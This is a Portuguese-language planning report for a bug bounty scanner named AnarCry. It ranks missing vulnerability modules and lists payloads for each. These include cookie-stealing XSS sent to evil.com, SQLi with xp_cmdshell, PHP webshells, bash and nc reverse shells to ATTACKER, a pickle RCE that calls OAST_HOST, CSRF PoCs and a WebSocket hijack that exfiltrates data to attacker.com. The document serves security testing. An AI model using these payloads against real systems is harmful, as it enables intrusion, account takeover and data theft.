# AnarCry — Relatório de Gaps de Bug Bounty

**Gerado:** 2026-10-24  
**Fonte:** Análise consolidada de 8 repositórios de referência  
**Escopo:** Módulos ausentes no AnarCry vs. frequência real em programas de bug bounty  

---

## Módulos Atuais (referência)

TLS · Headers (HSTS/CSP/cookies) · JWT (alg:none/RS→HS/JWK/kid) · PQC · CORS · OAuth · OpenRedirect · SSRF · GraphQL · CRLF · XXE · SSTI · IDOR · HostHeader · SpringActuator · MassAssignment · CachePoisoning · RequestSmuggling · Crawler

**Total: 19 módulos implementados**

---

## Frequência Consolidada por Gap

| Vulnerabilidade | Repos (de 8) | Bounty Freq. | Prioridade |
|---|---|---|---|
| XSS (todas as variantes) | 6/8 | Alta | CRÍTICO |
| SQL Injection | 7/8 | Alta | CRÍTICO |
| LFI / Path Traversal | 6/8 | Alta | CRÍTICO |
| Command Injection (OS) | 4/8 | Alta | CRÍTICO |
| Insecure Deserialization | 4/8 | Alta | CRÍTICO |
| File Upload Bypass → RCE | 5/8 | Alta | CRÍTICO |
| CSRF | 5/8 | Alta | ALTO |
| Race Condition (TOCTOU) | 4/8 | Alta | ALTO |
| NoSQL Injection | 5/8 | Alta | ALTO |
| Broken Auth / Password Reset | 5/8 | Alta | ALTO |
| Subdomain Takeover | 5/8 | Alta | ALTO |
| Business Logic Flaws | 3/8 | Média | ALTO |
| WebSocket Security (CSWSH) | 4/8 | Média | ALTO |
| OOB/OAST (blind detection) | 1/8 | Alta | ALTO |
| 2FA Bypass | 3/8 | Média | ALTO |
| Cloud Misconfiguration (S3/Firebase/GCP) | 2/8 | Alta | ALTO |
| Secrets em JavaScript/Repos | 2/8 | Alta | ALTO |
| Prototype Pollution | 2/8 | Média | ALTO |
| SAML Injection / XSW | 1/8 | Alta | ALTO |
| SSI Injection | 2/8 | Média | MÉDIO |
| Web Cache Deception | 2/8 | Média | MÉDIO |
| LDAP Injection | 2/8 | Baixa | MÉDIO |
| HTTP Parameter Pollution | 3/8 | Baixa | MÉDIO |
| Exposed Source Code (.git/.svn) | 2/8 | Alta | MÉDIO |
| Clickjacking | 2/8 | Alta | MÉDIO |
| WAF Bypass (cross-cutting) | 2/8 | Alta | MÉDIO |
| CSP Bypass (exploitability) | 1/8 | Baixa | MÉDIO |
| DNS Rebinding | 2/8 | Baixa | MÉDIO |
| XSLT Injection | 1/8 | Média | MÉDIO |
| Token Entropy / Session Predictability | 1/8 | Média | MÉDIO |
| API Version Fuzzing | 1/8 | Média | MÉDIO |
| Next.js RSC RCE (CVE-2025-55182) | 1/8 | Alta | MÉDIO |
| Log4Shell / JNDI Injection | 1/8 | Baixa | MÉDIO |
| Dependency Confusion | 1/8 | Alta | MÉDIO |
| XPATH Injection | 1/8 | Baixa | BAIXO |
| Type Juggling (PHP) | 1/8 | Baixa | BAIXO |
| CSV / Formula Injection | 1/8 | Baixa | BAIXO |
| Tabnabbing | 2/8 | Baixa | BAIXO |
| Broken Link Hijacking | 1/8 | Baixa | BAIXO |
| DoS / ReDoS / CPDoS | 2/8 | Média | BAIXO |
| HTTP TRACE/TRACK | 1/8 | Baixa | BAIXO |
| Email Spoofing (SPF/DMARC) | 1/8 | Média | BAIXO |
| Source Map Exposure (.js.map) | 1/8 | Média | BAIXO |

---

## Gaps CRÍTICOS — Implementação Imediata

### 1. XSS (Cross-Site Scripting)

**Repos:** AllAboutBugBounty · CatSec · hackerone-reports · KingOfBugBountyTips · Payloads4All · SecurityTesting (6/8)  
**Bounty frequency:** Alta — $500–$20.000 em programas públicos; 58+ entries no HackerOne top lists  
**CVSS estimado:** 5.4–8.8 (varia por contexto: reflected < stored < DOM com cookie theft)

#### Ataque

XSS acontece quando input do usuário é renderizado no DOM sem sanitização. Variantes:

- **Reflected XSS:** payload no parâmetro GET refletido na resposta imediata
- **Stored XSS:** payload persistido no banco e exibido a outros usuários (inclui painéis admin — blind XSS)
- **DOM-based XSS:** payload processado pelo JavaScript do lado cliente via `document.location`, `innerHTML`, `eval`
- **Blind XSS:** payload dispara horas/dias depois quando admin abre painel interno

Vetores além do campo de texto: SVG upload, metadados EXIF, campos de markdown, atributos XML, PostMessage listeners.

#### Payloads de Detecção

```
# Básico (reflexão imediata)
<script>alert(1)</script>
<img src=x onerror=alert(document.domain)>
<svg/onload=alert(1)>

# WAF Bypass — Cloudflare
<svg%0Aonauxclick=0;[1].some(confirm)//
`alert\`1\``

# WAF Bypass — Imperva
globalThis['alert'](1)

# WAF Bypass — AWS WAF
<script>eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))</script>

# WAF Bypass — ModSecurity
jav%0Dascript&colon;alert(1)

# DOM XSS
javascript:/*--></title></style></textarea></script></xmp><svg/onload=alert(1)>

# Blind XSS (para painéis admin)
"><script src=https://xss.report/c/SEU_ID></script>

# SVG upload XSS
<svg xmlns='http://www.w3.org/2000/svg'><script>fetch('https://evil.com?c='+document.cookie)</script></svg>

# Filter evasion — case variation
<ScRiPt>alert(1)</ScRiPt>
<scr<script>ipt>alert(1)</scr</script>ipt>

# Event handler alternativo
<details open ontoggle=alert(1)>
<video><source onerror=alert(1)>

# Polyglot (funciona em múltiplos contextos)
jaVasCript:/*-/*`/*`/*'/*"/**/(/* */oNcLiCk=alert() )//
```

#### Implementação no AnarCry

- **Fase 1 — Detecção por reflexão:** injetar canary único por parâmetro (`xss-<uuid>`) e verificar reflexão no response body; testar todos os parâmetros GET/POST/headers (User-Agent, Referer, X-Forwarded-For)
- **Fase 2 — Contexto HTML:** identificar contexto (dentro de tag, em atributo, em script block, em CSS) e selecionar payload apropriado ao contexto; evitar falsos positivos por encoding
- **Fase 3 — DOM XSS:** analisar JS da página via regex para sinks perigosos (`innerHTML`, `document.write`, `eval`, `location.href`, `setTimeout(string)`) e fontes controláveis (`location.search`, `location.hash`, `document.referrer`)
- **Fase 4 — Stored XSS:** após injetar em campos de formulário, seguir o crawler para verificar onde o dado é exibido; usar canary único por campo/sessão
- **Fase 5 — WAF Detection + Bypass:** detectar presença de WAF (assinatura no response header/body) e selecionar payloads de bypass específicos por fornecedor

---

### 2. SQL Injection

**Repos:** AllAboutBugBounty · BulletPentest · CatSec · hackerone-reports · KingOfBugBountyTips · Payloads4All · SecurityTesting (7/8 — mais universal)  
**Bounty frequency:** Alta — $10.000–$25.000 registrados (Valve $25k, Starbucks ERP); tecnicamente o bug de maior impacto individual  
**CVSS estimado:** 7.5–10.0 (blind = 7.5; UNION com dump = 9.1; RCE via xp_cmdshell = 10.0)

#### Ataque

Parâmetros de entrada interpolados diretamente em queries SQL. Variantes:

- **Error-based:** mensagem de erro retorna dados do banco (CONVERT, ExtractValue, UpdateXML)
- **Union-based:** UNION SELECT para extrair dados arbitrários de tabelas
- **Boolean-based blind:** diferença na resposta para condição verdadeira vs. falsa
- **Time-based blind:** SLEEP/WAITFOR para exfiltração binária por temporização
- **Out-of-band:** DNS/HTTP callback para exfiltração assíncrona (xp_cmdshell, load_file)
- **Second-order:** payload armazenado hoje, executado em query posterior

Alvos: MySQL, PostgreSQL, MSSQL (xp_cmdshell), Oracle, SQLite. Vetores além de parâmetros: cookies, headers User-Agent/Referer/X-Forwarded-For, campos de busca, IDs em path.

#### Payloads de Detecção

```sql
-- Detecção básica (causar erro ou diferença)
'
''
`
')
'))
' OR '1'='1
' OR 1=1--
' AND 1=2--

-- Time-based blind (MySQL)
' AND SLEEP(5)--
1' AND SLEEP(5)-- -

-- Time-based blind (MSSQL)
'; WAITFOR DELAY '0:0:5'--
1' AND 1=CONVERT(INT,serverproperty('productversion'))--

-- Time-based blind (PostgreSQL)
'; SELECT pg_sleep(5)--

-- UNION column count detection
1 ORDER BY 1--
1 ORDER BY 2--
1 UNION SELECT NULL--
1 UNION SELECT NULL,NULL--

-- UNION data extraction (MySQL)
-1 UNION SELECT 1,2,version()--
-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--

-- MSSQL RCE
'; EXEC master..xp_cmdshell 'whoami'--

-- WAF bypass via comments
SE/**/LECT 1,2,3
UN/**/ION SE/**/LECT NULL--
%00UNION%00SELECT%00NULL--

-- Boolean blind
' AND SUBSTRING(version(),1,1)='5'--
```

#### Implementação no AnarCry

- **Fase 1 — Error-based:** injetar `'`, `"`, `)`, `'--` em cada parâmetro e analisar response por mensagens de erro SQL (regex para "syntax error", "mysql_fetch", "ORA-", "Microsoft SQL Server", "pg_query")
- **Fase 2 — Time-based blind:** medir baseline de tempo de resposta, injetar `' AND SLEEP(5)--` e derivados por banco-alvo; confirmação requer 3 amostras para eliminar jitter de rede
- **Fase 3 — Boolean blind:** comparar respostas para `' AND 1=1--` vs. `' AND 1=2--`; diff por tamanho de body, código de status e hash de conteúdo
- **Fase 4 — UNION detection:** incrementar colunas até eliminar erro; testar tipos de dado por coluna (NULL vs. string vs. int)
- **Fase 5 — Context & WAF bypass:** detectar banco pelo fingerprint de erro; gerar variantes de payload com comment-injection, URL encoding duplo e case variation; integrar com detecção de WAF do módulo Headers

---

### 3. LFI / Path Traversal

**Repos:** AllAboutBugBounty · CatSec · hackerone-reports · KingOfBugBountyTips · Payloads4All · SecurityTesting (6/8)  
**Bounty frequency:** Alta — GitLab $12k, Mozilla VPN $6k, Apache CVE-2021-41773 $4k  
**CVSS estimado:** 5.3–9.8 (leitura de arquivo = 5.3; log poisoning → RCE = 9.8)

#### Ataque

Parâmetros que referenciam arquivos no sistema (`page=`, `file=`, `template=`, `path=`, `include=`) permitem travessia de diretório para ler arquivos arbitrários. Evolui para RCE via:

- **Log poisoning:** injetar PHP em User-Agent → gravado em `/var/log/apache2/access.log` → incluir o log via LFI
- **PHP wrappers:** `php://filter` para ler source code em base64; `php://input` para executar PHP via POST; `zip://`, `phar://`, `data://` para carregar código
- **Proc filesystem:** `/proc/self/environ` (variáveis de ambiente), `/proc/self/fd/N` (file descriptors abertos)

#### Payloads de Detecção

```
# Detecção básica
../../../../etc/passwd
../../../etc/passwd
../../../../../../etc/passwd

# Bypass de filtros via encoding
..%2F..%2F..%2Fetc%2Fpasswd
%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%252f..%252fetc%252fpasswd  (double URL encode)
....//....//....//etc/passwd  (double-dot bypass)
..\/..\/etc\/passwd           (mix de separadores)

# PHP wrappers
php://filter/convert.base64-encode/resource=config.php
php://filter/zlib.deflate/convert.base64-encode/resource=/etc/shadow
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=

# Windows path traversal
..\..\..\..\windows\system32\drivers\etc\hosts
..\..\..\windows\win.ini

# Null byte (PHP < 5.3.4)
../../../../etc/passwd%00
../../../../etc/passwd%00.jpg

# Log poisoning (User-Agent a injetar antes)
User-Agent: <?php system($_GET['cmd']); ?>
Depois: ?page=/var/log/apache2/access.log&cmd=id

# Proc
/proc/self/environ
/proc/self/fd/10
```

#### Implementação no AnarCry

- **Fase 1 — Identificação de parâmetros:** via crawler, catalogar parâmetros que contenham "file", "page", "include", "path", "template", "load", "read", "dir", "folder", "url"
- **Fase 2 — Traversal básico:** injetar payloads com alvos comuns (`/etc/passwd`, `/etc/hosts`, `windows/win.ini`) e verificar conteúdo esperado via regex (regex: `root:x:0:0`, `\[extensions\]`)
- **Fase 3 — Encoding bypass:** para cada traversal bem-sucedido ou near-miss (mudança de resposta), tentar variantes de encoding (URL, double-URL, mix de separadores)
- **Fase 4 — PHP wrapper detection:** verificar se resposta contém base64 decodificável em PHP source quando `php://filter` é usado; indicativo forte de inclusão bem-sucedida
- **Fase 5 — Log poisoning chain:** se LFI confirmado em servidor Apache/Nginx, automaticamente tentar log poisoning via User-Agent injection seguida de inclusão do log

---

### 4. Command Injection (OS)

**Repos:** CatSec · KingOfBugBountyTips · Payloads4All · SecurityTesting (4/8)  
**Bounty frequency:** Alta em RCE direto; frequente em funcionalidades de conversão, ping, DNS lookup  
**CVSS estimado:** 7.2–10.0 (blind sem output = 7.2; ativo com output = 9.8; blind com OOB = 9.8)

#### Ataque

Parâmetros de entrada concatenados em chamadas de sistema (`system()`, `exec()`, `popen()`, `subprocess.call()`, backtick). Vetores comuns: campos de host para ping/traceroute, conversores de arquivo, campos de URL para fetch, EXIF processing.

Variantes:
- **Active/Reflected:** output do comando retorna na resposta HTTP
- **Blind time-based:** `; sleep 5` detectado por delta de tempo
- **Blind OOB:** `; curl attacker.com/$(whoami)` — confirmado por callback externo

#### Payloads de Detecção

```bash
# Separadores de comando
; id
| id
|| id
&& id
`id`
$(id)

# Blind time-based
; sleep 5
| ping -c 5 127.0.0.1
& timeout /t 5        # Windows

# OOB via DNS/HTTP (requer canal receptor)
; curl http://OAST_HOST/$(whoami)
; nslookup $(whoami).OAST_HOST
`curl http://OAST_HOST/?c=$(cat /etc/passwd|base64)`

# Bypass de espaço
${IFS}id
{cat,/etc/passwd}
cat${IFS}/etc/passwd

# Bypass de blacklist via encoding hex
$(printf '\x69\x64')  # id em hex

# Chaining para reverse shell
; bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'
; nc -e /bin/bash ATTACKER 4444
```

#### Implementação no AnarCry

- **Fase 1 — Identificação de superfície:** parâmetros com nomes `host`, `ip`, `url`, `domain`, `cmd`, `exec`, `command`, `ping`, `query`, `file`, `path` em contexto de funcionalidade de rede ou conversão
- **Fase 2 — Injection ativa:** injetar separadores básicos (`; id`, `| id`, `$(id)`) e verificar se output de comando aparece na resposta
- **Fase 3 — Blind time-based:** injetar `; sleep 5` e medir delta de tempo; threshold de 4s+ sobre baseline = confirmado
- **Fase 4 — OOB (requer módulo OAST):** injetar callback DNS/HTTP para OAST endpoint; confirmar execução sem depender da resposta HTTP
- **Fase 5 — Apache Camel / Jenkins:** testar header `CamelExecCommandExecutable` e endpoint `/script` do Jenkins Console como vetores específicos de alta frequência em 2026

---

### 5. Insecure Deserialization

**Repos:** CatSec · hackerone-reports · Payloads4All · SecurityTesting (4/8)  
**Bounty frequency:** Média-Alta — Pornhub $20k (PHP), RedTube $10k, Krisp.ai RCE  
**CVSS estimado:** 7.5–10.0 (depende do gadget chain disponível)

#### Ataque

Objetos serializados enviados pelo cliente são desserializados sem validação. O atacante modifica o objeto para acionar gadget chains que resultam em RCE, SSRF ou privilege escalation.

Linguagens afetadas:
- **PHP:** cookies/sessões com `O:class:` serialization; gadget chains via phpggc
- **Java:** `rO0AB` em base64 (magic bytes `\xac\xed\x00\x05`); ysoserial gadget chains (CommonsCollections, Spring, Hibernate)
- **Python:** pickle (`\x80\x04\x95` magic); `cos\nsystem\n(S'id'\ntR.`
- **Ruby:** Marshal (`\x04\x08`); Gem::Requirement gadget
- **.NET:** ViewState sem MAC; BinaryFormatter

#### Payloads de Detecção

```
# PHP — detecção de serialização
O:8:"stdClass":0:{}
O:4:"User":1:{s:4:"name";s:5:"admin";}
O:4:"User":2:{s:4:"name";s:5:"admin";s:7:"isAdmin";b:1;}

# Java — magic bytes em base64
rO0ABXNy...  (qualquer payload de ysoserial em base64)
# Detecção: verificar se parâmetro aceita rO0AB sem erro (HTTP 200 vs 400/500)
java -jar ysoserial.jar CommonsCollections1 'curl http://OAST_HOST' | base64

# Python pickle RCE
import pickle, base64, os
class Exploit(object):
    def __reduce__(self): return (os.system, ('curl http://OAST_HOST/$(id)',))
base64.b64encode(pickle.dumps(Exploit()))

# PHP gadget chain via phpggc
phpggc Laravel/RCE1 system id
phpggc Symfony/RCE4 system 'curl http://OAST_HOST'

# .NET ViewState sem MAC — tentar modificar e re-enviar
```

#### Implementação no AnarCry

- **Fase 1 — Detecção de superfície:** identificar parâmetros/cookies/headers que contenham dados serializado; detectar magic bytes de Java (`rO0AB`) e PHP (`O:`) em base64 e raw
- **Fase 2 — Fingerprinting de linguagem:** a partir do stack tecnológico detectado pelo módulo TLS/Headers, selecionar toolkit adequado (ysoserial para Java/Spring, phpggc para PHP)
- **Fase 3 — Gadget chain segura (canary):** usar gadget chain que apenas faz DNS lookup para OAST endpoint — sem RCE direto, apenas confirmação de execução
- **Fase 4 — OAST confirmation:** se callback DNS/HTTP for recebido, reportar como RCE confirmado via deserialization
- **Fase 5 — Cobertura de cookies e JSON:** além de parâmetros de formulário, verificar cookies (`session=`, `auth=`, `token=`), campos JSON com estrutura nested complexa e headers customizados

---

### 6. File Upload Bypass

**Repos:** AllAboutBugBounty · CatSec · hackerone-reports · Payloads4All · SecurityTesting (5/8)  
**Bounty frequency:** Alta — Starbucks RCE via upload ($0 mas 823 upvotes), ecjobs RCE (688 upvotes)  
**CVSS estimado:** 5.3 (XSS via SVG) a 10.0 (RCE via webshell)

#### Ataque

Servidores que aceitam upload de arquivos sem validação rigorosa permitem: execução remota de código (via webshell .php), XSS stored (via SVG malicioso), SSRF (via FFmpeg HLS), path traversal no filename.

Vetores de bypass:
- **Content-Type spoof:** enviar `Content-Type: image/jpeg` com arquivo `.php`
- **Extensão alternativa:** `.php3`, `.php4`, `.php5`, `.phtml`, `.phar` quando `.php` bloqueado
- **Double extension:** `shell.php.jpg` — bypass de filtro `contains(".jpg")`
- **Magic bytes:** prefixo `GIF89a` + código PHP: `GIF89a;<?php system($_GET['cmd']); ?>`
- **Null byte:** `shell.php%00.jpg` — PHP < 5.3.4 trunca no null byte
- **Path traversal no filename:** `../../../etc/crontab` como nome do arquivo
- **SVG XSS:** `<svg><script>alert(document.domain)</script></svg>`
- **FFmpeg HLS SSRF:** arquivo .m3u8 que força o servidor a fazer requisição para metadata AWS

#### Payloads de Detecção

```
# Webshell PHP básica
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_POST['c']); ?>

# Magic bytes + webshell
GIF89a;<?php system($_GET['cmd']); ?>

# Extensões alternativas (tentar todas)
shell.php3
shell.php4
shell.php5
shell.phtml
shell.phar
shell.php.jpg
shell.jpg.php
shell.PHP  (uppercase)

# SVG XSS
<svg xmlns='http://www.w3.org/2000/svg'><script>alert(document.domain)</script></svg>

# FFmpeg SSRF via HLS
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
http://169.254.169.254/latest/meta-data/
#EXT-X-ENDLIST

# Path traversal em filename (via Burp intercept)
Content-Disposition: form-data; name="file"; filename="../../../etc/crontab"
```

#### Implementação no AnarCry

- **Fase 1 — Upload discovery:** via crawler, identificar endpoints de upload (multipart/form-data, input type=file, Swagger com `binary` type)
- **Fase 2 — Extension fuzzing:** submeter arquivo de extensões proibidas com Content-Type legítimo; verificar se arquivo é aceito e se path de acesso é retornado
- **Fase 3 — Execution test:** se arquivo `.php`/`.phtml`/`.phar` for aceito, tentar acesso ao path retornado com parâmetro `?cmd=id`; verificar output
- **Fase 4 — SVG/XML path:** submeter SVG com payload XSS; verificar se Content-Type na resposta de visualização do arquivo é `image/svg+xml` (executa JS)
- **Fase 5 — Filename path traversal:** interceptar request de upload e modificar `filename` para incluir `../` sequences; verificar se arquivo é gravado fora do diretório esperado

---

## Gaps ALTOS — Alta Prioridade

### 7. CSRF (Cross-Site Request Forgery)

**Repos:** AllAboutBugBounty · CatSec · hackerone-reports · Payloads4All · SecurityTesting (5/8)  
**Bounty frequency:** Alta — GitHub Enterprise $10k, HackerOne GraphQL CSRF $3.370  
**CVSS estimado:** 4.3–8.1 (ação de leitura = 4.3; alteração de senha/email = 8.1)

#### Ataque

Requisições de estado mutante (troca de email, senha, transferências) sem token CSRF único permitem que uma página maliciosa faça o browser autenticado submeter a ação.

Técnicas de bypass de proteção existente:
1. Token vazio: `csrf_token=`
2. Token removido: remover o parâmetro
3. Token de outro usuário válido: reutilizar token de conta própria do atacante
4. Troca de método: `POST` → `GET` (GitHub $10k bypass)
5. Token base64 decode/encode: token com parte estática + sufixo dinâmico
6. `null` como valor: `csrf_token=null`
7. Requisição GraphQL via GET: `GET /api/graphql?query=mutation{deleteAccount{id}}`
8. SameSite=None sem Secure (subdomínio comprometido como bypass de SameSite=Lax)

#### Payloads

```html
<!-- POST básico com auto-submit -->
<form action='https://target.com/api/change-email' method='POST'>
  <input name='email' value='attacker@evil.com'/>
</form>
<script>document.forms[0].submit()</script>

<!-- GET via img tag -->
<img src='https://target.com/api/delete?id=123'>

<!-- JSON CSRF via fetch (quando CORS mal configurado) -->
<script>
fetch('https://target.com/transfer', {
  method: 'POST',
  body: JSON.stringify({amount:1000,to:'attacker'}),
  credentials: 'include'
})
</script>

<!-- GraphQL mutation via GET -->
GET /api/graphql?query=mutation{changePassword(new:"hacked"){success}}
```

#### Implementação no AnarCry

- Identificar endpoints mutantes (POST/PUT/DELETE/PATCH) que alteram estado sensível
- Verificar ausência de token CSRF ou uso de token estático/previsível
- Testar os 8 bypass técnicos listados acima em sequência
- Verificar header `SameSite` nos cookies de sessão — ausência ou `None` eleva risco
- Reportar com PoC HTML pronto para reprodução

---

### 8. Race Condition (TOCTOU)

**Repos:** hackerone-reports · KingOfBugBountyTips · Payloads4All · SecurityTesting (4/8)  
**Bounty frequency:** Alta — HackerOne gift card race $3k, 2FA race condition $2-5k típico  
**CVSS estimado:** 5.3–8.1 (abuso de cupom = 5.3; bypass de autenticação = 8.1)

#### Ataque

Janela de tempo entre verificação de estado e uso (TOCTOU — Time of Check to Time of Use) permite enviar múltiplas requisições antes que a primeira seja processada. Alvos comuns: gift cards, cupons, referral bonuses, transferências, votos/likes, limites de uso.

Técnica moderna: **HTTP/2 single-packet attack** — todas as requisições chegam ao servidor em um único pacote TCP, eliminando jitter de rede e maximizando a janela de colisão.

#### Payloads

```
# Identificação de endpoints vulneráveis
grep -iE '(redeem|coupon|vote|like|follow|transfer|withdraw|refund|loyalty)' urls.txt

# Burp Suite Turbo Intruder — gate synchronization
import time
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30, engine=Engine.BURP2)
    for i in range(30):
        engine.queue(target.req, gate='race1')
    engine.openGate('race1')

# Python threading
import threading, requests
def redeem(session, code):
    return session.post('https://target.com/redeem', data={'code': code})
threads = [threading.Thread(target=redeem, args=(s, 'GIFT50')) for _ in range(20)]
[t.start() for t in threads]
[t.join() for t in threads]
```

#### Implementação no AnarCry

- Detectar endpoints com padrão semântico de uso único via regex nos paths/parâmetros
- Enviar N requisições em paralelo (padrão: 20) usando HTTP/2 quando disponível
- Comparar respostas: se múltiplas retornam sucesso para uma ação que deveria ser única, confirmar
- Integrar com módulo de Business Logic para reportar contexto de impacto financeiro

---

### 9. NoSQL Injection

**Repos:** AllAboutBugBounty · CatSec · KingOfBugBountyTips · Payloads4All · SecurityTesting (5/8)  
**Bounty frequency:** Alta em stacks modernas (Node.js + MongoDB prevalente)  
**CVSS estimado:** 7.5–9.8 (auth bypass = 9.1; blind data extraction = 7.5)

#### Ataque

Operadores MongoDB (`$ne`, `$gt`, `$regex`, `$where`) injetados em campos de autenticação ou busca permitem bypass de autenticação ou extração cega de dados.

#### Payloads

```
# Auth bypass (POST JSON)
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": "admin", "password": {"$gt": ""}}
{"username": {"$ne": "invalid"}, "password": {"$ne": "invalid"}}

# Auth bypass (URL encoded)
username[$ne]=toto&password[$ne]=toto
username[$gt]=&password[$gt]=

# Blind extraction via $regex
username[$ne]=toto&password[$regex]=^a
username[$ne]=toto&password[$regex]=^ab
# (iterar para extrair senha char a char)

# JavaScript injection via $where
{"$where": "this.username == 'admin' && this.password.length > 0"}
true, $where: '1 == 1'

# PHP arbitrary function via $func
{"username": {"$func": "sleep"}, "args": [5]}
```

#### Implementação no AnarCry

- Detectar tecnologia MongoDB/NoSQL via headers de response (`X-Powered-By: Express`, erros de `CastError`, `$oid`)
- Injetar operadores `[$ne]`, `[$gt]`, `[$regex]` nos campos de login e busca
- Para auth bypass: comparar response com login válido vs. inválido — resposta de sucesso com operador = confirmado
- Para blind extraction: implementar loop de regex incremental para enumerar senhas

---

### 10. Broken Authentication / Password Reset Flaws

**Repos:** AllAboutBugBounty · CatSec · hackerone-reports · Payloads4All · SecurityTesting (5/8)  
**Bounty frequency:** Alta — GitLab ATO $35k (984 upvotes), Uber token leak $10k  
**CVSS estimado:** 7.5–9.8 (token predicível = 7.5; ATO completo = 9.8)

#### Vetores

1. **Host Header Injection em reset:** `X-Forwarded-Host: evil.com` — link de reset enviado ao atacante
2. **HTTP Parameter Pollution:** `email=victim@example.com&email=attacker@evil.com`
3. **Token predictability:** reset token de 6 dígitos numéricos = brute forceable
4. **Token reuse:** token de reset funciona após já ter sido usado
5. **Response manipulation:** modificar `{"reset": false}` para `{"reset": true}`
6. **Re-registration com whitespace:** `admin ` (trailing space) bypassa duplicate check

#### Payloads

```http
# Host Header Injection
POST /forgot-password HTTP/1.1
Host: evil.com
X-Forwarded-Host: evil.com

{"email": "victim@target.com"}

# HTTP Parameter Pollution
POST /forgot-password
email=victim@target.com&email=attacker@evil.com

# Carbon copy via CRLF
email=victim@target.com%0a%0dcc:attacker@evil.com

# Separadores de email
email=victim@target.com%00
email=victim@target.com|attacker@evil.com
email=victim@target.com,attacker@evil.com

# XSS em campo de email para reset
"<svg/onload=alert(1)>"@gmail.com
```

#### Implementação no AnarCry

- Integrar com módulo HostHeader existente para testar reset de senha especificamente
- Enumerar usernames via diferença de resposta ("email not found" vs. "reset sent")
- Testar HPP no campo de email com dois endereços
- Verificar comprimento e entropia de tokens de reset para detectar predictability
- Testar reutilização de token após uso bem-sucedido

---

### 11. Subdomain Takeover

**Repos:** AllAboutBugBounty · BulletPentest · hackerone-reports · KingOfBugBountyTips · SecurityTesting (5/8)  
**Bounty frequency:** Alta — Roblox auth bypass via takeover (782 upvotes), Uber auth bypass (182 upvotes)  
**CVSS estimado:** 5.3–9.1 (conteúdo arbitrário = 5.3; autenticação bypass + CORS = 9.1)

#### Ataque

CNAME de subdomínio aponta para serviço externo não mais registrado (AWS S3, Heroku, GitHub Pages, Azure, Fastly, Zendesk). Atacante registra o recurso no serviço e controla conteúdo do subdomínio.

Quando combinado com CORS wildcard (`*.target.com`), permite roubo de dados de APIs autenticadas.

#### Payloads de Detecção

```bash
# Pipeline de detecção
subfinder -d target.com -silent | dnsx -silent -cname -resp-only | \
  grep -iE '(s3\.amazonaws|cloudfront|herokuapp|github\.io|azurewebsites|shopify|fastly|zendesk|readme\.io|ghost\.io|surge\.sh)'

# Verificação manual de NXDOMAIN
dig CNAME subdomain.target.com
# Se CNAME aponta para serviço mas host retorna NXDOMAIN ou "NoSuchBucket" = vulnerável

# Nuclei templates
nuclei -l subdomains.txt -t nuclei-templates/dns/takeovers/

# Verificação de S3
aws s3 ls s3://subdomain-name --no-sign-request
# "NoSuchBucket" = disponível para takeover
```

#### Implementação no AnarCry

- Integrar com crawler para coletar todos os subdomínios e CNAMEs encontrados
- Verificar cada CNAME contra lista de serviços conhecidamente vulneráveis a takeover
- Para cada candidato, verificar se resposta é NXDOMAIN ou mensagem de "recurso não encontrado" específica do serviço
- Verificar se configuração CORS do domínio principal usa wildcard que incluiria o subdomínio

---

### 12. WebSocket Security (CSWSH)

**Repos:** reverse-burp-ui · SecurityTesting · KingOfBugBountyTips · Payloads4All (4/8)  
**Bounty frequency:** Média — crescente com adoção de SPAs e APIs real-time  
**CVSS estimado:** 5.4–8.8 (IDOR em WS = 5.4; CSWSH + exfiltração = 8.8)

#### Ataque

WebSocket connections sem validação de `Origin` permitem **Cross-Site WebSocket Hijacking (CSWSH)**: página maliciosa abre WebSocket para `wss://target.com` usando cookies do usuário.

Além de CSWSH, outros vetores: IDOR nas mensagens (`{"userId":1}` → `{"userId":2}`), injeção de payloads (SQLi, XSS, CMDi) no corpo das mensagens WS, falta de autenticação nos endpoints WS.

#### Payloads

```javascript
// CSWSH — exfiltrar dados via WebSocket hijacking
var ws = new WebSocket('wss://target.com/chat');
ws.onmessage = function(e) {
    fetch('https://attacker.com/?d=' + btoa(e.data));
};

// IDOR em mensagem WebSocket
// Original: {"action":"getUser","userId":1}
// Modificar: {"action":"getUser","userId":2}

// Injeção de payload XSS em mensagem WS
{"type":"message","payload":"<script>alert(1)</script>"}

// SQLi em campo de busca via WS
{"action":"search","query":"' OR SLEEP(5)--"}
```

#### Implementação no AnarCry

- Detectar endpoints WebSocket via crawler (`wss://`, `ws://` em JS sources, Upgrade headers)
- Verificar se handshake valida `Origin` header — testar com `Origin: https://evil.com`
- Tentar conexão sem cookie/token de autenticação
- Para mensagens descobertas, injetar payloads de SQLi, XSS e path traversal
- Verificar IDOR modificando IDs de usuário em mensagens de perfil/dados

---

### 13. OOB/OAST — Out-of-Band Application Security Testing

**Repos:** reverse-burp-ui (1/8) — mas afeta TODOS os módulos de detecção blind  
**Bounty frequency:** Alta — impacto crítico: blind SSRF, blind XXE, blind SQLi, blind CMDi são indetectáveis sem OOB  
**CVSS estimado:** N/A (é infraestrutura de detecção, não vulnerabilidade)

#### Por que é crítico

Os módulos SSRF e XXE do AnarCry só detectam vulnerabilidades **reflexivas** (resposta retorna ao cliente). A maioria dos casos reais em bug bounty é **blind** — a requisição sai mas nada retorna no response HTTP. Sem canal OOB, o AnarCry perde:

- Blind SSRF (requisição para metadata service sem reflexão)
- Blind XXE (entidade externa que faz DNS lookup sem refletir output)
- Blind Command Injection (execução sem output no response)
- Blind SQL Injection out-of-band (DNS/HTTP via `load_file`, `xp_cmdshell`)
- Insecure Deserialization sem reflexão imediata

#### Implementação no AnarCry

- Implementar servidor receptor OOB (DNS + HTTP) com UUID único por payload/teste
- Para cada módulo que testa injeção cega, incluir variante com callback para servidor OOB
- Polling assíncrono: continuar scan e verificar callbacks recebidos ao final ou em background
- Exemplos de payload OOB por módulo:
  - XXE: `<!ENTITY xxe SYSTEM "http://OOB_HOST/xxe-<uuid>?data=...">` 
  - SSRF: URL = `http://OOB_HOST/ssrf-<uuid>`
